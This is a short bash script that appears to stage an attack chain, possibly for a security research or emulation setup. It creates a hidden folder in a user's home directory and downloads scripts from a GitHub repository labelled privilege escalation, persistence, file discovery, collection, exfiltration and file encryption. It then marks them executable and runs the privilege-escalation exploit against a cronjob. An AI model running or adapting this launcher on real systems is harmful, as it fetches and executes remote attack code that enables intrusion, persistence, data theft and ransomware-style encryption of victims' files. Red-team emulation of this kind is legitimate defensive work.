#!/bin/bash
cd /home/resch
# Create hidden folder
mkdir .scripts
cd /home/resch/.scripts
#PE
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/PEexploit.sh
# Persistence
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/persistence1.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/persistence2.sh
# File discovery
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/file_and_dir_discovery.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/file_and_dir_discovery-stripped.sh
# Collection
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/collectiontarget.sh
# Exfiltration
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_target.sh
# Encryption
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/check.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/encrypt.py
# Attack chain
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/attack_chain.sh
# Chmod execute
chmod -R +x /home/resch/.scripts
# Other files
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/requirements.txt

echo "Start of exploit...."
echo "Running PE exploit for cronjob..."
./PEexploit.sh


